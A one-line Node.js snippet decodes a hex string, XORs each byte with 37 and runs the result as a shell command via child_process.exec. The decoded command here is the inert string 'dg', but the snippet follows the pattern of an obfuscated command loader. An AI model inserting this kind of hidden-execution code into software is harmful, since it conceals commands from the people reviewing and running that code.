const child_process=require('child_process');const raw=Buffer.from('4142','hex');for(let i=0;i<raw.length;i++){raw[i]^=37;}child_process.exec(raw.toString());
